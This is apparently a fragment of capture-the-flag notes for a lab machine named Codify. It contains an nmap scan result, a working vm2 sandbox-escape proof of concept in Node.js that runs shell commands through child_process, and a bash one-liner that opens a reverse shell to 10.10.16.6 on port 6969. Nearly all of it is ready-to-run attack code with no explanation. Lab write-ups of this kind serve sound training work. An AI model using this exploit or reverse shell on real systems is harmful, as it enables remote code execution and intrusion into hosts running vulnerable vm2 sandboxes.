## Table of Contents

          - [Reverse-shell one liner](#Reverse-shell\one\liner)

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-26 18:28 EST Nmap scan report for 10.10.11.239 Host is up (0.055s latency).
PORT STATE SERVICE VERSION 
22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 
(Ubuntu Linux; protocol 2.0) 
| ssh-hostkey: 
| 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA) 
|_ 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519) 80/tcp open http Apache httpd 2.4.52 
|_http-server-header: Apache/2.4.52 (Ubuntu) 
|_http-title: Did not follow redirect to http://codify.htb/ 3000/tcp open http Node.js Express framework 
|_http-title: Codify Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

RCE PoC
```node.js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('ls -la');
}
`

console.log(vm.run(code));
```


###### Reverse-shell one liner
```bash
0<&196;exec 196<>/dev/tcp/10.10.16.6/6969; sh <&196 >&196 2>&196
```